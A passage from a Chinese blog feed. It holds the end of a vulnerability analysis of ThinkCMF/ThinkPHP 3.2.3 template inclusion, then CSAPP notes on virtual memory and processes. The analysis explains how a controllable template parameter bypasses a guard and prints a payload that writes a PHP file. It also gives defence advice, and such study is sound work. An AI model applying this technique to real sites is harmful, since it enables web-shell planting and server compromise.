class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::display(<span class="keyword">$this</span>-&gt;parseTemplate($templateFile), $charset, $contentType, $content, $prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parseTemplate()</code> 前面一大段没有对 <code>template</code> 进行处理，然后是文件就直接返回，这里不用关心了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HomebaseController.class.php line 170</span></span><br><span class="line"><span class="keyword">if</span> (is_file($template)) &#123;</span><br><span class="line">    <span class="keyword">return</span> $template;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模板显示 调用内置的模板引擎显示方法，</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $templateFile 指定要调用的模板文件</span></span><br><span class="line"><span class="comment"> * 默认为空 由系统自动定位模板文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $charset 输出编码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $contentType 输出类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $content 输出内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $prefix 模板缓存前缀</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;display($templateFile, $charset, $contentType, $content, $prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到 <code>$this-&gt;view-&gt;display()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 加载模板和页面输出 可以返回输出内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $templateFile 模板文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $charset 模板输出字符集</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $contentType 输出类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $content 模板输出内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $prefix 模板缓存前缀</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">G(<span class="string">'viewStartTime'</span>);</span><br><span class="line"><span class="comment">// 视图开始标签</span></span><br><span class="line">Hook::listen(<span class="string">'view_begin'</span>, $templateFile);</span><br><span class="line"><span class="comment">// 解析并获取模板内容</span></span><br><span class="line">$content = <span class="keyword">$this</span>-&gt;fetch($templateFile, $content, $prefix);</span><br><span class="line"><span class="comment">// 输出模板内容</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;render($content, $charset, $contentType);</span><br><span class="line"><span class="comment">// 视图结束标签</span></span><br><span class="line">Hook::listen(<span class="string">'view_end'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续看 <code>fetch()</code> 的实现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">'php'</span> == strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>))) &#123; <span class="comment">// 使用PHP原生模板，默认为 Thinkphp</span></span><br><span class="line">$_content = $content;</span><br><span class="line"><span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">extract(<span class="keyword">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line"><span class="comment">// 直接载入PHP模板</span></span><br><span class="line"><span class="keyword">empty</span>($_content) ? <span class="keyword">include</span> $templateFile : <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $_content);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 视图解析标签</span></span><br><span class="line">$params = <span class="keyword">array</span>(<span class="string">'var'</span> =&gt; <span class="keyword">$this</span>-&gt;tVar, <span class="string">'file'</span> =&gt; $templateFile, <span class="string">'content'</span> =&gt; $content, <span class="string">'prefix'</span> =&gt; $prefix);</span><br><span class="line">Hook::listen(<span class="string">'view_parse'</span>, $params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这完成的文件读取。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbg30oaphkj20sr0880u9.jpg" alt="image.png"></p><p>然后编译模板。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译模板内容</span></span><br><span class="line">$tmplContent = <span class="keyword">$this</span>-&gt;compiler($tmplContent);</span><br><span class="line">Storage::put($tmplCacheFile, trim($tmplContent), <span class="string">'tpl'</span>);</span><br></pre></td></tr></table></figure><p>编译的过程中还稍微做了下安全处理，这里能绕吗？能！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加安全代码</span></span><br><span class="line">$tmplContent = <span class="string">'&lt;?php if (!defined(\'THINK_PATH\')) exit();?&gt;'</span> . $tmplContent;</span><br><span class="line"><span class="comment">// 优化生成的php代码</span></span><br><span class="line">$tmplContent = str_replace(<span class="string">'?&gt;&lt;?php'</span>, <span class="string">''</span>, $tmplContent);  <span class="comment">// 这一句反而帮了倒忙</span></span><br></pre></td></tr></table></figure><p>再写入临时文件，其中文件名是 $templateFile 的 md5 哈希值。</p><p>最终 include 这个模板。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbg3923cglj20i904f0t9.jpg" alt="image.png"></p><p>文件包含到这里就结束了，相比 fetch，他多了个 render 的方法来进行输出，所以有回显。</p><p>继续看如何写 shell，str_replace 是怎么帮的倒忙。</p><p>作者原意是在模板前面加入退出语句，使得必须从单入口进入，但有了 include 之后，这个也不用管啦。</p><p>结合这个替换，模板内容中的 PHP 语句可以直接拼接上去，比如复现中给出的 payload 产生的效果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!defined(<span class="string">'THINK_PATH'</span>)) <span class="keyword">exit</span>(); file_put_contents(<span class="string">'i.php'</span>,<span class="string">'&lt;?php phpinfo(); ?&gt;'</span>);</span><br></pre></td></tr></table></figure><h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h3><p>有了上面的铺垫，fetch 这里分析起来就更简单了，而且不再需要传 templateFile 参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    $templateFile = <span class="keyword">empty</span>($content) ? <span class="keyword">$this</span>-&gt;parseTemplate($templateFile) : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::fetch($templateFile, $content, $prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终处理的方法是一样的，不再赘述。</p><p>Comment 模块和 Api 模块都能调用到 fetch，所以也是触发点。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果参数可控且不转义 <code>&lt;&gt;</code>，可以利用的还有<code>$this-&gt;show()</code>，这三个方法在 TP3 上是通用的。</p><p>看了一下其他人的分析文章，发现有些被带偏了，真的需要模板标签吗？display 真的不能写 shell 吗？</p><p>话说回来，如果 <code>&lt;?</code> 这种标签被过滤掉了，确实可以通过模板标签 <code>&lt;php&gt;&lt;/php&gt;</code> 解析来绕一下。</p><p>如何防御？最简单的就是将这些本不该 public 的方法“私有化”，最好的还是将传入参数尖括号编码。</p><p>不过，即使不能直接访问了，结合一些反序列化链这些方法或许还能利用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.riskivy.com/thinkcmf-框架上的任意内容包含漏洞" target="_blank" rel="noopener">https://blog.riskivy.com/thinkcmf-%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://mochazz.github.io/2019/07/25/ThinkCMFX漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;ThinkCMF 是一款基于 PHP+MYSQL 开发的中文内容管理框架，底层采用 ThinkPHP3.2.3 构建。&lt;/p&gt;
&lt;p&gt;远程攻
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://wywwzjj.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 虚拟存储器 笔记</title>
    <link href="https://wywwzjj.top/2019/11/11/CSAPP-Chapter-9-Notes/"/>
    <id>https://wywwzjj.top/2019/11/11/CSAPP-Chapter-9-Notes/</id>
    <published>2019-11-11T14:57:57.000Z</published>
    <updated>2020-02-01T04:03:38.690Z</updated>
    
    <content type="html"><![CDATA[<p>一个系统中的进程是与其他进程共享 CPU 和主存资源的。然而，共享主存会形成一些特殊的挑战。</p><p>虚拟内存提供了三个重要的能力：</p><ul><li>它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在主存之间来回传送数据，通过这种方式，它高效地使用了主存。</li><li>它为每个进程提供了一致的地址空间，从而简化了内存管理。</li><li>它保护了每个进程的地址空间不被其他进程破坏。</li></ul><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgromwsnaj20hu0g3q5d.jpg" alt="image.png"></p><h2 id="内存管理要干些啥？"><a href="#内存管理要干些啥？" class="headerlink" title="内存管理要干些啥？"></a>内存管理要干些啥？</h2><ul><li><p>内存空间的分配与回收</p></li><li><p>内存空间的扩充</p><ul><li>覆盖技术</li><li>交换技术</li><li>虚拟存储</li></ul></li><li><p>地址转换：逻辑 =&gt; 物理</p></li><li><p>存储保护：保证各进程只在自己的内存空间访问，不会越界</p><ul><li>上下界寄存器</li><li>重定位寄存器 + 界地址寄存器</li></ul></li></ul><h3 id="资源推荐"><a href="#资源推荐" class="headerlink" title="资源推荐"></a>资源推荐</h3><p>LWN.net 上有一系列的 “<strong>What every programmer should know about memory</strong>” 文章你需要读一下。当然，你可以直接访问一个完整的 <a href="http://futuretech.blinkenlights.nl/misc/cpumemory.pdf" target="_blank" rel="noopener">PDF 文档</a>。下面是这个系列文章的网页版列表。读完这个列表的内容，你基本上就对内存有了一个比较好的知识体系了。</p><ul><li><a href="https://lwn.net/Articles/250967/" target="_blank" rel="noopener">Part 1: Introduction</a> ，中译版为 “<a href="https://www.oschina.net/translate/what-every-programmer-should-know-about-memory-part1" target="_blank" rel="noopener">每个程序员都应该了解的内存知识【第一部分】</a>”</li><li><a href="https://lwn.net/Articles/252125/" target="_blank" rel="noopener">Part 2: CPU caches</a></li><li><a href="http://lwn.net/Articles/253361/" target="_blank" rel="noopener">Part 3 (Virtual memory)</a></li><li><a href="http://lwn.net/Articles/254445/" target="_blank" rel="noopener">Part 4 (NUMA systems)</a></li><li><a href="http://lwn.net/Articles/255364/" target="_blank" rel="noopener">Part 5 (What programmers can do - cache optimization)</a></li><li><a href="http://lwn.net/Articles/256433/" target="_blank" rel="noopener">Part 6 (What programmers can do - multi-threaded optimizations)</a></li><li><a href="http://lwn.net/Articles/257209/" target="_blank" rel="noopener">Part 7 (Memory performance tools)</a></li><li><a href="https://lwn.net/Articles/258154/" target="_blank" rel="noopener">Part 8 (Future technologies)</a></li><li><a href="https://lwn.net/Articles/258188/" target="_blank" rel="noopener">Part 9 (Appendices and bibliography)</a></li></ul><h2 id="连续分配"><a href="#连续分配" class="headerlink" title="连续分配"></a>连续分配</h2><p>分类：</p><ul><li>单一连续：只支持单道程序，内存分为系统区和用户区</li><li>固定分区</li><li>动态分区：在程序被装入内存时，根据进程的大小动态调整分区<ul><li>首次适应</li><li>最佳适应</li><li>最坏适应</li><li>邻近适应</li></ul></li></ul><p>缺点：</p><ul><li>分配给一个程序的物理内存是连续的</li><li>内存利用率低</li><li>有内外碎片问题</li></ul><h2 id="非连续分配"><a href="#非连续分配" class="headerlink" title="非连续分配"></a>非连续分配</h2><p>优点：</p><ul><li>一个程序的物理地址空间是非连续的</li><li>更好的内存利用和管理</li><li>允许共享代码与数据（共享库等）</li><li>支持动态加载和动态链接</li></ul><p>缺点：</p><ul><li>如何建立虚拟地址和物理地址之间的转换<ul><li>软件方案</li><li>硬件方案</li></ul></li></ul><h2 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h2><p>段是信息的逻辑单位。</p><p>分段的目的是更好地满足用户需求。</p><p>一个段通常包含着一组属于一个逻辑模块的信息，更容易实现信息的共享和保护。</p><p>分段对用户是可见的，用户编程时需要显式给出段名。</p><p>段的大小不固定，取决于用户编写的程序（低级语言）。</p><ul><li><p>程序text段</p><ul><li>库</li><li>用户代码</li></ul></li><li><p>程序数据段</p></li><li><p>运行栈</p></li><li><p>堆</p></li></ul><p>段表：段号、段长、基址</p><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>页是信息的物理单位。分页的目的是为了实现离散分配，提高内存利用率。</p><p>分页仅仅是系统管理上的需要，完全是系统行为，对用户不可见。</p><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>作用：记录进程中各个页与所占用内存块的关系，形成映射。</p><h3 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h3><h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>单页表遇到的问题：</p><ul><li>页表必须连续存放，若页表项小，总的页表太占空间；页表项过大，内碎片影响大。</li><li>没有必要让所有页表常驻内存，进程在一段时间内可能只需要访问几个特定的页面。</li></ul><p>实现对页表本身的虚拟存储。</p><p>注意：</p><ul><li>各级页表的大小不能超过一个页面。若两级不够，可分成多级</li><li>多级页表访存次数（无快表） = 页表级数 + 1</li></ul><h2 id="段页"><a href="#段页" class="headerlink" title="段页"></a>段页</h2><p>进程分段 =》段分页 =》内存分块</p><p>维护一个段表和若干个页表</p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>程序不需全部装入即可运行，运行时根据需要动态调入数据，若内存不够，还需换出一些数据。</p><h3 id="请求调页"><a href="#请求调页" class="headerlink" title="请求调页"></a>请求调页</h3><p>访问的信息不在内存时，由操作系统负责将所需信息从外存调入内存</p><p>页表结构：内存块号    中断位P    访问位A    修改位M    外存地址</p><p>缺页中断与一般的 I/O 中断区别：</p><ul><li>缺页中断是指令执行时中断，而普通的是两条指令执行之间。</li><li>缺页中断是运行状态，而普通的是阻塞态。</li></ul><h3 id="页面置换"><a href="#页面置换" class="headerlink" title="页面置换"></a>页面置换</h3><p>内存空间不够时，将内存中暂时用不到的信息换出到外存，换出时注意清掉快表中的缓存。</p><p>理想置换算法要求：被换出的页面在以后的运行中不需要。</p><ul><li><p>先进先出（FIFS）</p><p>  往下挤。实现简单，性能差，可能出现 Belady 现象，即增加内存块后，缺页中断却增加。</p></li><li><p>最近最久未使用（LRU）</p><p>  依然是往下挤，区别在于，一旦命中，提到栈顶。</p></li><li><p>最近最不常用（LFU）</p><p>  记录访问次数，淘汰访问次数最小的，但这样实现太麻烦，所以直接在对应的内存块上计数。</p></li><li><p>最近未使用（NRU）</p><p>  搞一个定时器，定期清除访问位。</p></li><li><p>二次机会（Second Chance）</p><p>  一般来说不用管改进算法，只要 A</p><p>  请求调页时，不算访问，之后的命中才算，而且从时间最久开始，遇到0就直接淘汰，遇1置0。</p><p>  置换掉的页作为最新页放顶上，注意是按时钟旋转，而不是直接往下挤。</p><p>  改进后的算法加了一个判断位——修改位M，减少了I/O，也降低了抖动现象。</p></li><li><p>页缓冲</p></li></ul><h2 id="物理和虚拟寻址"><a href="#物理和虚拟寻址" class="headerlink" title="物理和虚拟寻址"></a>物理和虚拟寻址</h2><p>计算机系统的主存被组织成一个由 M 个连续的字节大小的单元组成的数组。每个字节都有一个唯一的物理地址。</p><p>在物理地址与虚拟地址间加个地址翻译就构成了虚拟寻址。</p><h2 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h2><p>地址空间是一个非负整数地址的有序集合。</p><p>地址空间的概念是很重要的，因为它清楚地区分了数据对象（字节）和他们的属性（地址）。</p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>内存成了对硬盘的缓存，虚拟页面可划分为未分配的、未缓存的和已缓存的。</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><ul><li>简化链接</li><li>简化加载</li><li>简化共享</li><li>简化内存分配</li></ul><h2 id="内存保护"><a href="#内存保护" class="headerlink" title="内存保护"></a>内存保护</h2><h2 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h2><p>逻辑地址到物理地址</p><h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p>回到本章前言，“虚拟内存是强大的”。</p><ul><li>你知道可以通过读写内存位置读或者修改一个磁盘文件的内容吗？</li><li>可以加载一个文件的内容到内存中，而不需要进行任何显示地复制吗？</li></ul><p>将一个文件或其他对象映射到进程的地址空间，实现文件磁盘地址和进程地址空间中一段虚拟地址的一一对应。</p><p>实现了这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用 read、write 等系统调用函数。</p><p>相反，内核空间对这段区域的修改也直接反应用户空间，从而可以实现不同进程的文件共享。</p><p>简单总结，有如下特点：</p><ul><li>提高数据的读、写和传输的时间性能<ul><li>减少了数据拷贝次数</li><li>用户空间和内核空间的高效交互（通过映射区域直接交互）</li><li>用内存读写代替 I/O 读写</li></ul></li><li>提高内存利用率：通过虚拟内存、共享对象</li></ul><h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个系统中的进程是与其他进程共享 CPU 和主存资源的。然而，共享主存会形成一些特殊的挑战。&lt;/p&gt;
&lt;p&gt;虚拟内存提供了三个重要的能力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在主存之间来回传送数据
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 异常控制流 笔记</title>
    <link href="https://wywwzjj.top/2019/10/28/CSAPP-Chapter-8-Notes/"/>
    <id>https://wywwzjj.top/2019/10/28/CSAPP-Chapter-8-Notes/</id>
    <published>2019-10-28T13:13:22.000Z</published>
    <updated>2020-02-01T03:52:58.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><strong>关键抽象：</strong></p><ul><li>一个独立的逻辑控制流，它提供一个假象，好像程序独占了处理器。</li><li>一个私有的地址空间，它提供了一个假象，好像程序独占了内存系统。</li></ul><h3 id="进程实体"><a href="#进程实体" class="headerlink" title="进程实体"></a>进程实体</h3><p>程序段、数据段、PCB 三部分组成了进程实体（进程映像）。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>传统定义：</p><ul><li>进程是程序的一次执行过程</li><li>进程是一个程序及其数据在处理机上顺序执行时所发生的活动</li><li>进程是具有独立功能的程序在数据集合上运行的过程，它是系统进行资源分配和调度的一个独立单位</li></ul><p>进程是进程实体的运行过程，是系统进行<strong>资源分配</strong>和<strong>调度</strong>的一个独立单位。</p><p>一道程序在一个数据集上的一次执行过程。</p><h3 id="PCB"><a href="#PCB" class="headerlink" title="PCB"></a>PCB</h3><ul><li><p>基本描述信息</p><ul><li><p>进程名（通常用文件名或命令名称表示）</p></li><li><p>进程标识符PID（唯一标识符）</p></li><li><p>用户标识符UID</p></li><li><p>当前进程状态</p></li></ul></li><li><p>管理信息</p><ul><li>程序和数据的地址</li><li>I/O操作相关参数</li><li>进程通信信息</li></ul></li><li><p>控制信息</p><ul><li>现场信息（各种寄存器值，进程切换时这些运行情况都要保存到PCB中）</li><li>调度参数</li><li>同步、互斥信号量</li></ul></li></ul><h3 id="组织形式"><a href="#组织形式" class="headerlink" title="组织形式"></a>组织形式</h3><ul><li><p>链接方式：按照进程状态将 PCB 分为多个队列，操作系统持有指向各个队列的指针</p></li><li><p>索引方式：根据进程状态的不同，建立几张索引表（底层是个啥），操作系统持有指向各个索引表的指针</p></li></ul><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul><li>动态性：进程是程序的一次执行过程，是动态地产生、变化和消亡的（最基本的特征）</li><li>并发性：内存中有多个进程实体，各进程可并发执行</li><li>独立性：进程是操作系统分配资源的基本单位，一个进程的程序和数据只能由该进程本身访问。</li><li>异步性：各进程按各自独立的、不可预知的速度向前推进，操作系统要提供“进程同步机制”来解决异步问题</li><li>结构性：每个进程都配置一个 PCB。结构上来看，进程由程序段、数据段和PCB组成</li></ul><h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><p>运行态：CPU、其他资源均满足</p><p>就绪态：已具备运行条件，只欠CPU</p><p>阻塞态：因等待某一事件而不能执行。CPU、其他资源均不满足。等待操作系统或其他进程唤醒。</p><p>创建态：操作系统为进程分配资源、初始化PCB</p><p>终止态：进程正在从系统中撤销，操作系统将回收进程所拥有的资源、撤销PCB</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgrb7tzr2j20ol0fx10g.jpg" alt="image.png"></p><p>注意：</p><ul><li><p>不能由阻塞态直接转换为运行态</p><p>  申请的资源被分配，或等待时间发生了，只代表其他资源满足，此时进入就绪态，还要等CPU。</p></li><li><p>不能由就绪态转换成阻塞态。</p><p>  因为进入阻塞态需要进程主动请求，必然需要在运行时才能发出请求。</p></li></ul><h2 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h2><p>作业与进程调度的区别：作业是内外存的调度，进程是CPU与内存间的调度</p><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><ul><li><p>周转时间和平均周转时间</p><p>  周转时间 = 完成时刻 - 提交作业时刻</p><p>  平均周转时间 = 总周转时间 / n</p><p>  加权平均周转算法 = </p></li><li><p>响应时间</p></li><li><p>评价调度性能的其他指标</p><ul><li>公平合理</li><li>提高资源利用率</li><li>吞吐量</li></ul></li></ul><h3 id="作业调度"><a href="#作业调度" class="headerlink" title="作业调度"></a>作业调度</h3><p>作业调度：按一定的策略从后备队列中选择一部分作业，为他们分配运行所必须的资源、创建进程的过程。</p><p>总的来说，都是一个作业执行结束后再开始调度。</p><p>提交状态：</p><p>后备状态：</p><p>执行状态：作业进入了内存</p><p>完成状态：</p><h4 id="先来先服务算法（FCFS）"><a href="#先来先服务算法（FCFS）" class="headerlink" title="先来先服务算法（FCFS）"></a>先来先服务算法（FCFS）</h4><p>对长作业有利、短作业不利</p><h4 id="短作业优先算法（SJF）"><a href="#短作业优先算法（SJF）" class="headerlink" title="短作业优先算法（SJF）"></a>短作业优先算法（SJF）</h4><p>上一作业运行结束后，在就绪作业里选择时间最短的。</p><h4 id="高响应比优先算法（HRN）"><a href="#高响应比优先算法（HRN）" class="headerlink" title="高响应比优先算法（HRN）"></a>高响应比优先算法（HRN）</h4><p>响应比 = （系统当前时间 - 作业提交时间） / 作业大小</p><p>优先选择响应比最大的作业</p><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>从进程就绪队列中选一个进程，让其占用CPU运行。</p><h4 id="时间片轮转算法（RR）"><a href="#时间片轮转算法（RR）" class="headerlink" title="时间片轮转算法（RR）"></a>时间片轮转算法（RR）</h4><p>公平地、轮流地为各个进程服务，让每个进程在一定时间间隔内都可以得到响应。</p><p>优点：公平、响应快，适用于分时操作系统。</p><p>缺点：由于高频率的进程切换，因此有一定开销；不区分任务的紧急程度。</p><h4 id="优先级算法（Priority）"><a href="#优先级算法（Priority）" class="headerlink" title="优先级算法（Priority）"></a>优先级算法（Priority）</h4><p>调度时选择优先级最高的作业 / 进程。</p><p>优先级分配有静态和动态两种。</p><p>对于 I/O 繁忙和 CPU 繁忙的进程，应该赋予 I/O 繁忙进程更高的优先级，有利于提高并行程度。</p><h4 id="多级反馈队列算法"><a href="#多级反馈队列算法" class="headerlink" title="多级反馈队列算法"></a>多级反馈队列算法</h4><h4 id="时限调度算法"><a href="#时限调度算法" class="headerlink" title="时限调度算法"></a>时限调度算法</h4><p>用于实时系统的调度。</p><h3 id="交换调度"><a href="#交换调度" class="headerlink" title="交换调度"></a>交换调度</h3><p>缓解内存紧张，将一部分就绪状态或阻塞状态进程调出到外存，需要的时候再调回来，即内外存交换。</p><h3 id="设备调度"><a href="#设备调度" class="headerlink" title="设备调度"></a>设备调度</h3><p>让哪个进程使用该设备。</p><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p><strong>根本原因</strong>：系统拥有的资源数量小于各进程对资源的需求总数。</p><p>死锁：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进。</p><p>​            至少有两个或两个以上的进程同时死锁，死锁进程一定处于阻塞态。</p><p>饥饿：可能只有一个进程发生饥饿。</p><p>死循环：可能只有一个进程发生死循环，死循环的进程也可能就绪。</p><p>死锁和饥饿是操作系统要解决的问题，死循环是程序员的事情。</p><p>如果系统中的所有进程存在一个可完成的执行序列P1，…，Pn，则称系统处于安全状态。</p><h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul><li>互斥：对必须互斥使用的资源的争夺才会导致死锁。</li><li>不剥夺：进程保持的资源只能主动释放，不能被强行剥夺。</li><li>请求与保持：保持着某些资源不放的同时，请求别的资源。</li><li>环路等待：存在一种进程资源的循环等待链。循环等待未必死锁。</li></ul><h4 id="处理策略"><a href="#处理策略" class="headerlink" title="处理策略"></a>处理策略</h4><p>预防：破坏死锁产生的四个必要条件</p><p>避免：避免系统进入不安全状态（银行家算法）</p><p>检测和解除：允许死锁发生，系统负责检测出死锁并解除。</p><p>忽略：鸵鸟算法</p><h3 id="逻辑控制流"><a 